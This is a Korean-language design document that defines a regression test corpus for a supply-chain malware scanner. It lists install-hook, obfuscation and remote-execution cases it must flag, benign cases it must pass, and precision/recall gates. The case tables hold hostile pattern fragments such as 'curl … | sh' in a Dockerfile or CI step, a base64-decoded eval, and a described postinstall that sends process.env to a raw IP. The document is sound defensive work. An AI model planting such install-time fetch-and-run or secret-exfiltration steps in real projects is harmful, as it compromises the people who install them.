# 탐지 케이스 코퍼스 (use-cases)

`proposal.md`의 재설계 엔진을 검증·회귀하는 **목표 케이스 모음**. 각 케이스는 "입력 형태 → 기대 탐지/등급
→ 왜(오탐/미탐 관점)"로 기술한다. **정탐 케이스(놓치면 안 됨)**와 **오탐 경계 케이스(잡으면 안 됨)**를
함께 둬야 precision/recall을 동시에 측정할 수 있다.

> 이 문서는 M1-M5 재설계 완료 후의 **목표 회귀 테스트 코퍼스**다. 현행 `docs/draft/scan.sh` MVP는
> npm lifecycle과 범용 정적 패턴 중심이므로, 아래 케이스 일부는 아직 미탐/저등급일 수 있다.
> 케이스를 추가할 때 "기대 등급"을 명시하면 엔진 변경 시 오탐/미탐 회귀를 자동 비교할 수 있다.

---

## A. 정탐 케이스 (반드시 탐지)

| # | 입력 형태 | 기대 탐지 (등급) | 검증 레버 |
|---|-----------|------------------|-----------|
| A1 | LinkedIn 실제 사례 기반: `prepare` → `app:pre` → `node app/index.js` → `require('./test')` → 위장 `app/test/index.js` | 설치트리거 **HIGH** + 다단계 실행경로 **HIGH** + 위장파일 MED | A·C·D·E |
| A1b | 합성 스트레스 케이스: `postinstall` → 위장 테스트 파일(15KB+·초장문·base64) → 디코드 후 외부 IP fetch | 설치트리거 **HIGH** + 원격실행 **HIGH** + 위장파일 MED | A·C·D·E |
| A2 | `package.json` `preinstall: "node setup.js"`, setup.js가 `child_process`로 셸 실행 | 설치트리거 **HIGH** (다단계 추적으로 훅→파일 연결) | A·D |
| A3 | `const p = Buffer.from('aHR0cDovL...','base64'); eval(p)` | 난독화 → 디코드 후 내부 `http://` 발견 → **HIGH 승격** | D·E |
| A4 | `Dockerfile`에 `RUN curl -fsSL http://x \| sh` | 원격실행 **HIGH** (컨테이너 빌드 트리거) | A·B |
| A5 | `.github/workflows/ci.yml` `run:` 스텝에 `curl … \| bash` | 원격실행 **HIGH/MED** (CI 설치-시 실행) | A·B |
| A6 | Python `setup.py`에 `os.system(...)` / 설치 중 네트워크 | 설치트리거 **HIGH** (pip 생태계) | A·B |
| A7 | 저장소에 `node_modules/` 포함 + 내부 패키지에 `postinstall` | node_modules 포함 **HIGH** + 훅 **HIGH** | A·B |
| A8 | `.npmrc`가 `registry=`/`_authToken` 재정의 | 레지스트리 **MED** | A·B |
| A9 | `process.env.AWS_SECRET`를 `fetch(...)` 인자 근처에서 사용 | 유출 **MED** + 키 식별자 INFO | B·C |

## B. 오탐 경계 케이스 (반드시 통과 = 잡지 말 것 / 저등급)

| # | 입력 형태 | 기대 결과 | 검증 레버 |
|---|-----------|-----------|-----------|
| B1 | `prepare: "husky"` (정상 git-hook 설치) | **INFO** (allowlist 감점) — HIGH 아님 | C·E |
| B2 | 주석 처리된 `// eval(userInput)` 또는 문서 예시 코드블록 | **무시** (주석/문자열 컨텍스트 제거) | C |
| B3 | `JSON.parse` 폴백 주변의 정당한 `new Function` (라이브러리 내부) | MED 이하, 근거와 함께 — 컨텍스트 감점 | C·E |
| B4 | 테스트 픽스처(`testdata/`)의 의도적 악성-유사 샘플 | 컨텍스트 태깅으로 감점 (본문 코드와 구분) | C |
| B5 | 정상 빌드의 `child_process`로 `git rev-parse`(브랜치 검증) | MED이나 **양성**으로 분류 가능한 근거 노출 | B·C |
| B6 | 압축된 `*.min.js`(난독 아님, 정상 번들) | 난독화 플래그에서 제외(확장자/맥락) | D |

## C. 생태계 확장 케이스 (npm 외)

| # | 생태계 | 입력 | 기대 |
|---|--------|------|------|
| C1 | pip | `pyproject.toml` PEP517 빌드 백엔드가 임의 코드 | 설치트리거 HIGH |
| C2 | go | `go.mod` + 의심 `//go:generate` 원격 실행 | MED |
| C3 | cargo | `build.rs`가 네트워크/셸 실행 | 설치트리거 HIGH |
| C4 | composer | `composer.json` `scripts`의 `post-install-cmd` | 설치트리거 HIGH |
| C5 | make | `Makefile` 기본 타겟이 `curl\|sh` | 원격실행 HIGH |

---

## 상세 워크스루 2건

### W1 · LinkedIn 실제 사례 기반 재현 (정탐 A1)

```
입력:
  package.json   → "scripts": { "prepare": "npm run app:pre", "app:pre": "node app/index.js" }
  app/index.js   → require('./test')
  app/test/index.js → 약 250줄 테스트 스위트로 위장, 조각난 도메인을 조립한 뒤 서버 응답을 실행

엔진 흐름:
  (2) 구조 파싱   → prepare 훅 추출 (정식 JSON 파싱, fallback 아님)
  (4-D) 다단계    → prepare → app:pre → app/index.js → app/test/index.js 추적
  (4-C) 컨텍스트  → "test" 경로지만 설치 훅에서 로드됨 → 위장파일 신호
  (4-D) 재검사    → 조립된 외부 URL + 서버 응답 실행 sink 식별
  (4-E) 점수      → 설치트리거(HIGH) + 다단계 실행경로(HIGH) + 위장파일(MED) 누적

기대 출력:
  HIGH ×2, MED ×1, 종료코드 1 — "설치 전 사람 검토 필수"
```

### W1b · 합성 난독 스트레스 케이스 (정탐 A1b)

```
입력:
  package.json   → "scripts": { "postinstall": "node app/test/index.js" }
  app/test/index.js → 18KB, 한 줄 12,000자(난독), 내부에 Buffer.from(<base64>,'base64')
                      디코드 시 http://185.x.x.x/collect 로 process.env 전송

기대 출력:
  HIGH ×2, MED ×1, 종료코드 1 — raw IP/base64/초장문 탐지 회귀용 합성 케이스
```

### W2 · 정상 husky 프로젝트 (오탐 경계 B1)

```
입력:
  package.json → "scripts": { "prepare": "husky" }
  .husky/pre-commit → lint-staged

엔진 흐름:
  (2) 구조 파싱   → prepare 훅 추출
  (4-C) allowlist → "husky"는 알려진 git-hook 도구 → 완화 신호
  (4-E) 점수      → base(HIGH 후보) − allowlist 감점 → INFO 구간

기대 출력:
  INFO ×1, HIGH 0, 종료코드 0 — "뚜렷한 위험 없음(그래도 첫 설치는 보수적으로)"
```

---

## 측정 방법

- 위 케이스를 고정 입력 픽스처로 만들고, 엔진을 돌려 **기대 등급 vs 실제 등급**을 비교.
- 지표: `precision = 정탐/(정탐+오탐)`, `recall = 정탐/(정탐+미탐)`.
- 회귀 게이트: A 케이스 recall 100%, B 케이스 오탐 0 을 깨면 변경 거부.
